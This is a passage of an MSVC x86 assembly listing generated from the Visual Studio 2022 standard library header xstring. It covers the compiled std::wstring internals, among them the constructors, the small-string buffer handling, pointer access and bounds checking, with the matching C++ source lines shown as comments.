  0003a	8b 4d f8	 mov	 ecx, DWORD PTR _this$[ebp]
  0003d	89 4d ec	 mov	 DWORD PTR tv89[ebp], ecx
  00040	68 00 00 00 00	 push	 OFFSET ?_Fake_alloc@std@@3U_Fake_allocator@1@B ; std::_Fake_alloc
  00045	8b 4d ec	 mov	 ecx, DWORD PTR tv89[ebp]
  00048	e8 00 00 00 00	 call	 ?_Alloc_proxy@_Container_base0@std@@QAEXABU_Fake_allocator@2@@Z ; std::_Container_base0::_Alloc_proxy

; 2818 :         _Take_contents(_Right);

  0004d	8b 55 08	 mov	 edx, DWORD PTR __Right$[ebp]
  00050	52		 push	 edx
  00051	8b 4d f8	 mov	 ecx, DWORD PTR _this$[ebp]
  00054	e8 00 00 00 00	 call	 ?_Take_contents@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEXAAV12@@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Take_contents

; 2819 :     }

  00059	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
  0005c	8b e5		 mov	 esp, ebp
  0005e	5d		 pop	 ebp
  0005f	c2 04 00	 ret	 4
??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAE@$$QAV01@@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Construct_empty@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEXXZ
_TEXT	SEGMENT
_this$ = -12						; size = 4
__My_data$ = -8						; size = 4
$T1 = -2						; size = 2
?_Construct_empty@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEXXZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct_empty, COMDAT
; _this$ = ecx

; 2643 :     _CONSTEXPR20 void _Construct_empty() {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 0c	 sub	 esp, 12			; 0000000cH
  00006	89 4d f4	 mov	 DWORD PTR _this$[ebp], ecx

; 2644 :         auto& _My_data = _Mypair._Myval2;

  00009	8b 45 f4	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	89 45 f8	 mov	 DWORD PTR __My_data$[ebp], eax

; 2645 :         _My_data._Alloc_proxy(_GET_PROXY_ALLOCATOR(_Alty, _Getal()));

  0000f	68 00 00 00 00	 push	 OFFSET ?_Fake_alloc@std@@3U_Fake_allocator@1@B ; std::_Fake_alloc
  00014	8b 4d f8	 mov	 ecx, DWORD PTR __My_data$[ebp]
  00017	e8 00 00 00 00	 call	 ?_Alloc_proxy@_Container_base0@std@@QAEXABU_Fake_allocator@2@@Z ; std::_Container_base0::_Alloc_proxy

; 2646 : 
; 2647 :         // initialize basic_string data members
; 2648 :         _My_data._Mysize = 0;

  0001c	8b 4d f8	 mov	 ecx, DWORD PTR __My_data$[ebp]
  0001f	c7 41 10 00 00
	00 00		 mov	 DWORD PTR [ecx+16], 0

; 2649 :         _My_data._Myres  = _Small_string_capacity;

  00026	8b 55 f8	 mov	 edx, DWORD PTR __My_data$[ebp]
  00029	c7 42 14 07 00
	00 00		 mov	 DWORD PTR [edx+20], 7

; 2650 :         _My_data._Activate_SSO_buffer();

  00030	8b 4d f8	 mov	 ecx, DWORD PTR __My_data$[ebp]
  00033	e8 00 00 00 00	 call	 ?_Activate_SSO_buffer@?$_String_val@U?$_Simple_types@_W@std@@@std@@QAEXXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Activate_SSO_buffer

; 2651 : 
; 2652 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 2653 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

  00038	33 c0		 xor	 eax, eax
  0003a	66 89 45 fe	 mov	 WORD PTR $T1[ebp], ax
  0003e	8d 4d fe	 lea	 ecx, DWORD PTR $T1[ebp]
  00041	51		 push	 ecx
  00042	ba 02 00 00 00	 mov	 edx, 2
  00047	6b c2 00	 imul	 eax, edx, 0
  0004a	03 45 f8	 add	 eax, DWORD PTR __My_data$[ebp]
  0004d	50		 push	 eax
  0004e	e8 00 00 00 00	 call	 ?assign@?$_WChar_traits@_W@std@@SAXAA_WAB_W@Z ; std::_WChar_traits<wchar_t>::assign
  00053	83 c4 08	 add	 esp, 8

; 2654 :     }

  00056	8b e5		 mov	 esp, ebp
  00058	5d		 pop	 ebp
  00059	c3		 ret	 0
?_Construct_empty@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEXXZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct_empty
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Deallocate_for_capacity@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAXAAV?$allocator@_W@2@QA_WI@Z
_TEXT	SEGMENT
__Al$ = 8						; size = 4
__Old_ptr$ = 12						; size = 4
__Capacity$ = 16					; size = 4
?_Deallocate_for_capacity@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAXAAV?$allocator@_W@2@QA_WI@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Deallocate_for_capacity, COMDAT

; 2638 :         _Alty& _Al, const pointer _Old_ptr, const size_type _Capacity) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 2639 :         _STL_INTERNAL_CHECK(_Capacity > _Small_string_capacity);
; 2640 :         _Al.deallocate(_Old_ptr, _Capacity + 1); // +1 for null terminator

  00003	8b 45 10	 mov	 eax, DWORD PTR __Capacity$[ebp]
  00006	83 c0 01	 add	 eax, 1
  00009	50		 push	 eax
  0000a	8b 4d 0c	 mov	 ecx, DWORD PTR __Old_ptr$[ebp]
  0000d	51		 push	 ecx
  0000e	8b 4d 08	 mov	 ecx, DWORD PTR __Al$[ebp]
  00011	e8 00 00 00 00	 call	 ?deallocate@?$allocator@_W@std@@QAEXQA_WI@Z ; std::allocator<wchar_t>::deallocate

; 2641 :     }

  00016	5d		 pop	 ebp
  00017	c3		 ret	 0
?_Deallocate_for_capacity@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAXAAV?$allocator@_W@2@QA_WI@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Deallocate_for_capacity
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAE@ABV01@@Z
_TEXT	SEGMENT
tv92 = -24						; size = 4
tv94 = -20						; size = 4
tv78 = -16						; size = 4
tv76 = -12						; size = 4
_this$ = -8						; size = 4
$T1 = -3						; size = 1
$T2 = -2						; size = 1
$T3 = -1						; size = 1
__Right$ = 8						; size = 4
??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAE@ABV01@@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >, COMDAT
; _this$ = ecx

; 2508 :         : _Mypair(_One_then_variadic_args_t{}, _Alty_traits::select_on_container_copy_construction(_Right._Getal())) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 18	 sub	 esp, 24			; 00000018H
  00006	89 4d f8	 mov	 DWORD PTR _this$[ebp], ecx
  00009	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	89 45 f0	 mov	 DWORD PTR tv78[ebp], eax
  0000f	8b 4d 08	 mov	 ecx, DWORD PTR __Right$[ebp]
  00012	e8 00 00 00 00	 call	 ?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@ABEABV?$allocator@_W@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
  00017	50		 push	 eax
  00018	8d 4d fe	 lea	 ecx, DWORD PTR $T2[ebp]
  0001b	51		 push	 ecx
  0001c	e8 00 00 00 00	 call	 ?select_on_container_copy_construction@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA?AV?$allocator@_W@2@ABV32@@Z ; std::_Default_allocator_traits<std::allocator<wchar_t> >::select_on_container_copy_construction
  00021	83 c4 08	 add	 esp, 8
  00024	89 45 f4	 mov	 DWORD PTR tv76[ebp], eax
  00027	8a 55 fd	 mov	 dl, BYTE PTR $T1[ebp]
  0002a	88 55 ff	 mov	 BYTE PTR $T3[ebp], dl
  0002d	8b 45 f4	 mov	 eax, DWORD PTR tv76[ebp]
  00030	50		 push	 eax
  00031	0f b6 4d ff	 movzx	 ecx, BYTE PTR $T3[ebp]
  00035	51		 push	 ecx
  00036	8b 4d f0	 mov	 ecx, DWORD PTR tv78[ebp]
  00039	e8 00 00 00 00	 call	 ??$?0V?$allocator@_W@std@@$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QAE@U_One_then_variadic_args_t@1@$$QAV?$allocator@_W@1@@Z ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><std::allocator<wchar_t> >

; 2509 :         _Construct<_Construct_strategy::_From_string>(_Right._Mypair._Myval2._Myptr(), _Right._Mypair._Myval2._Mysize);

  0003e	8b 55 08	 mov	 edx, DWORD PTR __Right$[ebp]
  00041	8b 42 10	 mov	 eax, DWORD PTR [edx+16]
  00044	89 45 ec	 mov	 DWORD PTR tv94[ebp], eax
  00047	8b 4d 08	 mov	 ecx, DWORD PTR __Right$[ebp]
  0004a	e8 00 00 00 00	 call	 ?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QBEPB_WXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr
  0004f	89 45 e8	 mov	 DWORD PTR tv92[ebp], eax
  00052	8b 4d ec	 mov	 ecx, DWORD PTR tv94[ebp]
  00055	51		 push	 ecx
  00056	8b 55 e8	 mov	 edx, DWORD PTR tv92[ebp]
  00059	52		 push	 edx
  0005a	8b 4d f8	 mov	 ecx, DWORD PTR _this$[ebp]
  0005d	e8 00 00 00 00	 call	 ??$_Construct@$01PB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEXQB_WI@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<2,wchar_t const *>

; 2510 :     }

  00062	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
  00065	8b e5		 mov	 esp, ebp
  00067	5d		 pop	 ebp
  00068	c2 04 00	 ret	 4
??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAE@ABV01@@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAE@XZ
_TEXT	SEGMENT
tv69 = -12						; size = 4
_this$ = -8						; size = 4
$T1 = -1						; size = 1
??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAE@XZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >, COMDAT
; _this$ = ecx

; 2499 :     basic_string() noexcept(is_nothrow_default_constructible_v<_Alty>) : _Mypair(_Zero_then_variadic_args_t{}) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 0c	 sub	 esp, 12			; 0000000cH
  00006	89 4d f8	 mov	 DWORD PTR _this$[ebp], ecx
  00009	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	89 45 f4	 mov	 DWORD PTR tv69[ebp], eax
  0000f	0f b6 4d ff	 movzx	 ecx, BYTE PTR $T1[ebp]
  00013	51		 push	 ecx
  00014	8b 4d f4	 mov	 ecx, DWORD PTR tv69[ebp]
  00017	e8 00 00 00 00	 call	 ??$?0$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QAE@U_Zero_then_variadic_args_t@1@@Z ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><>

; 2500 :         _Construct_empty();

  0001c	8b 4d f8	 mov	 ecx, DWORD PTR _this$[ebp]
  0001f	e8 00 00 00 00	 call	 ?_Construct_empty@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEXXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct_empty

; 2501 :     }

  00024	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
  00027	8b e5		 mov	 esp, ebp
  00029	5d		 pop	 ebp
  0002a	c3		 ret	 0
??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAE@XZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??1?$_String_val@U?$_Simple_types@_W@std@@@std@@QAE@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??1?$_String_val@U?$_Simple_types@_W@std@@@std@@QAE@XZ PROC ; std::_String_val<std::_Simple_types<wchar_t> >::~_String_val<std::_Simple_types<wchar_t> >, COMDAT
; _this$ = ecx
  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	e8 00 00 00 00	 call	 ??1_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QAE@XZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::~_Bxty
  0000f	8b e5		 mov	 esp, ebp
  00011	5d		 pop	 ebp
  00012	c3		 ret	 0
??1?$_String_val@U?$_Simple_types@_W@std@@@std@@QAE@XZ ENDP ; std::_String_val<std::_Simple_types<wchar_t> >::~_String_val<std::_Simple_types<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Switch_to_buf@_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QAEXXZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?_Switch_to_buf@_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QAEXXZ PROC ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::_Switch_to_buf, COMDAT
; _this$ = ecx

; 2291 :         _CONSTEXPR20 void _Switch_to_buf() noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 2292 :             _STD _Destroy_in_place(_Ptr);

  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	50		 push	 eax
  0000b	e8 00 00 00 00	 call	 ??$_Destroy_in_place@PA_W@std@@YAXAAPA_W@Z ; std::_Destroy_in_place<wchar_t *>
  00010	83 c4 04	 add	 esp, 4

; 2293 : 
; 2294 : #if _HAS_CXX20
; 2295 :             // start the lifetime of the array elements
; 2296 :             if (_STD is_constant_evaluated()) {
; 2297 :                 for (size_type _Idx = 0; _Idx < _BUF_SIZE; ++_Idx) {
; 2298 :                     _Buf[_Idx] = value_type();
; 2299 :                 }
; 2300 :             }
; 2301 : #endif // _HAS_CXX20
; 2302 :         }

  00013	8b e5		 mov	 esp, ebp
  00015	5d		 pop	 ebp
  00016	c3		 ret	 0
?_Switch_to_buf@_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QAEXXZ ENDP ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::_Switch_to_buf
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??1_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QAE@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??1_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QAE@XZ PROC ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::~_Bxty, COMDAT
; _this$ = ecx

; 2285 :         _CONSTEXPR20 ~_Bxty() noexcept {} // user-provided, for fancy pointers

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b e5		 mov	 esp, ebp
  00009	5d		 pop	 ebp
  0000a	c3		 ret	 0
??1_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QAE@XZ ENDP ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::~_Bxty
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??0_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QAE@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??0_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QAE@XZ PROC ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::_Bxty, COMDAT
; _this$ = ecx

; 2284 :         _CONSTEXPR20 _Bxty() noexcept : _Buf() {} // user-provided, for fancy pointers

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	33 c0		 xor	 eax, eax
  00009	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000c	89 01		 mov	 DWORD PTR [ecx], eax
  0000e	89 41 04	 mov	 DWORD PTR [ecx+4], eax
  00011	89 41 08	 mov	 DWORD PTR [ecx+8], eax
  00014	89 41 0c	 mov	 DWORD PTR [ecx+12], eax
  00017	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0001a	8b e5		 mov	 esp, ebp
  0001c	5d		 pop	 ebp
  0001d	c3		 ret	 0
??0_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QAE@XZ ENDP ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::_Bxty
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Xran@?$_String_val@U?$_Simple_types@_W@std@@@std@@SAXXZ
_TEXT	SEGMENT
?_Xran@?$_String_val@U?$_Simple_types@_W@std@@@std@@SAXXZ PROC ; std::_String_val<std::_Simple_types<wchar_t> >::_Xran, COMDAT

; 2272 :     [[noreturn]] static void _Xran() {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 2273 :         _Xout_of_range("invalid string position");

  00003	68 00 00 00 00	 push	 OFFSET ??_C@_0BI@CFPLBAOH@invalid?5string?5position@
  00008	e8 00 00 00 00	 call	 ?_Xout_of_range@std@@YAXPBD@Z ; std::_Xout_of_range
$LN1@Xran:

; 2274 :     }

  0000d	5d		 pop	 ebp
  0000e	c3		 ret	 0
?_Xran@?$_String_val@U?$_Simple_types@_W@std@@@std@@SAXXZ ENDP ; std::_String_val<std::_Simple_types<wchar_t> >::_Xran
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Check_offset@?$_String_val@U?$_Simple_types@_W@std@@@std@@QBEXI@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
__Off$ = 8						; size = 4
?_Check_offset@?$_String_val@U?$_Simple_types@_W@std@@@std@@QBEXI@Z PROC ; std::_String_val<std::_Simple_types<wchar_t> >::_Check_offset, COMDAT
; _this$ = ecx

; 2258 :     _CONSTEXPR20 void _Check_offset(const size_type _Off) const {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 2259 :         // checks whether _Off is in the bounds of [0, size()]
; 2260 :         if (_Mysize < _Off) {

  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	8b 48 10	 mov	 ecx, DWORD PTR [eax+16]
  0000d	3b 4d 08	 cmp	 ecx, DWORD PTR __Off$[ebp]
  00010	73 05		 jae	 SHORT $LN2@Check_offs

; 2261 :             _Xran();

  00012	e8 00 00 00 00	 call	 ?_Xran@?$_String_val@U?$_Simple_types@_W@std@@@std@@SAXXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Xran
$LN2@Check_offs:
$LN1@Check_offs:

; 2262 :         }
; 2263 :     }

  00017	8b e5		 mov	 esp, ebp
  00019	5d		 pop	 ebp
  0001a	c2 04 00	 ret	 4
?_Check_offset@?$_String_val@U?$_Simple_types@_W@std@@@std@@QBEXI@Z ENDP ; std::_String_val<std::_Simple_types<wchar_t> >::_Check_offset
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Activate_SSO_buffer@?$_String_val@U?$_Simple_types@_W@std@@@std@@QAEXXZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?_Activate_SSO_buffer@?$_String_val@U?$_Simple_types@_W@std@@@std@@QAEXXZ PROC ; std::_String_val<std::_Simple_types<wchar_t> >::_Activate_SSO_buffer, COMDAT
; _this$ = ecx

; 2247 :     _CONSTEXPR20 void _Activate_SSO_buffer() noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 2248 :         // start the lifetime of the array elements
; 2249 : #if _HAS_CXX20
; 2250 :         if (_STD is_constant_evaluated()) {
; 2251 :             for (size_type _Idx = 0; _Idx < _BUF_SIZE; ++_Idx) {
; 2252 :                 _Bx._Buf[_Idx] = value_type();
; 2253 :             }
; 2254 :         }
; 2255 : #endif // _HAS_CXX20
; 2256 :     }

  00007	8b e5		 mov	 esp, ebp
  00009	5d		 pop	 ebp
  0000a	c3		 ret	 0
?_Activate_SSO_buffer@?$_String_val@U?$_Simple_types@_W@std@@@std@@QAEXXZ ENDP ; std::_String_val<std::_Simple_types<wchar_t> >::_Activate_SSO_buffer
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Large_mode_engaged@?$_String_val@U?$_Simple_types@_W@std@@@std@@QBE_NXZ
_TEXT	SEGMENT
_this$ = -8						; size = 4
tv66 = -4						; size = 4
?_Large_mode_engaged@?$_String_val@U?$_Simple_types@_W@std@@@std@@QBE_NXZ PROC ; std::_String_val<std::_Simple_types<wchar_t> >::_Large_mode_engaged, COMDAT
; _this$ = ecx

; 2243 :     _NODISCARD _CONSTEXPR20 bool _Large_mode_engaged() const noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8
  00006	89 4d f8	 mov	 DWORD PTR _this$[ebp], ecx

; 2244 :         return _Myres > _Small_string_capacity;

  00009	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	83 78 14 07	 cmp	 DWORD PTR [eax+20], 7
  00010	76 09		 jbe	 SHORT $LN3@Large_mode
  00012	c7 45 fc 01 00
	00 00		 mov	 DWORD PTR tv66[ebp], 1
  00019	eb 07		 jmp	 SHORT $LN4@Large_mode
$LN3@Large_mode:
  0001b	c7 45 fc 00 00
	00 00		 mov	 DWORD PTR tv66[ebp], 0
$LN4@Large_mode:
  00022	0f b6 45 fc	 movzx	 eax, BYTE PTR tv66[ebp]

; 2245 :     }

  00026	8b e5		 mov	 esp, ebp
  00028	5d		 pop	 ebp
  00029	c3		 ret	 0
?_Large_mode_engaged@?$_String_val@U?$_Simple_types@_W@std@@@std@@QBE_NXZ ENDP ; std::_String_val<std::_Simple_types<wchar_t> >::_Large_mode_engaged
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QBEPB_WXZ
_TEXT	SEGMENT
__Result$ = -8						; size = 4
_this$ = -4						; size = 4
?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QBEPB_WXZ PROC ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr, COMDAT
; _this$ = ecx

; 2234 :     _NODISCARD _CONSTEXPR20 const value_type* _Myptr() const noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8
  00006	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 2235 :         const value_type* _Result = _Bx._Buf;

  00009	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	89 45 f8	 mov	 DWORD PTR __Result$[ebp], eax

; 2236 :         if (_Large_mode_engaged()) {

  0000f	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00012	e8 00 00 00 00	 call	 ?_Large_mode_engaged@?$_String_val@U?$_Simple_types@_W@std@@@std@@QBE_NXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Large_mode_engaged
  00017	0f b6 c8	 movzx	 ecx, al
  0001a	85 c9		 test	 ecx, ecx
  0001c	74 11		 je	 SHORT $LN2@Myptr

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

  0001e	8b 55 fc	 mov	 edx, DWORD PTR _this$[ebp]
  00021	8b 02		 mov	 eax, DWORD PTR [edx]
  00023	50		 push	 eax
  00024	e8 00 00 00 00	 call	 ??$_Unfancy@_W@std@@YAPA_WPA_W@Z ; std::_Unfancy<wchar_t>
  00029	83 c4 04	 add	 esp, 4
  0002c	89 45 f8	 mov	 DWORD PTR __Result$[ebp], eax
$LN2@Myptr:

; 2238 :         }
; 2239 : 
; 2240 :         return _Result;

  0002f	8b 45 f8	 mov	 eax, DWORD PTR __Result$[ebp]

; 2241 :     }

  00032	8b e5		 mov	 esp, ebp
  00034	5d		 pop	 ebp
  00035	c3		 ret	 0
?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QBEPB_WXZ ENDP ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QAEPA_WXZ
_TEXT	SEGMENT
__Result$ = -8						; size = 4
_this$ = -4						; size = 4
?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QAEPA_WXZ PROC ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr, COMDAT
; _this$ = ecx

; 2225 :     _NODISCARD _CONSTEXPR20 value_type* _Myptr() noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8
  00006	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 2226 :         value_type* _Result = _Bx._Buf;

  00009	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	89 45 f8	 mov	 DWORD PTR __Result$[ebp], eax

; 2227 :         if (_Large_mode_engaged()) {

  0000f	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00012	e8 00 00 00 00	 call	 ?_Large_mode_engaged@?$_String_val@U?$_Simple_types@_W@std@@@std@@QBE_NXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Large_mode_engaged
  00017	0f b6 c8	 movzx	 ecx, al
  0001a	85 c9		 test	 ecx, ecx
  0001c	74 11		 je	 SHORT $LN2@Myptr

; 2228 :             _Result = _Unfancy(_Bx._Ptr);

  0001e	8b 55 fc	 mov	 edx, DWORD PTR _this$[ebp]
  00021	8b 02		 mov	 eax, DWORD PTR [edx]
  00023	50		 push	 eax
  00024	e8 00 00 00 00	 call	 ??$_Unfancy@_W@std@@YAPA_WPA_W@Z ; std::_Unfancy<wchar_t>
  00029	83 c4 04	 add	 esp, 4
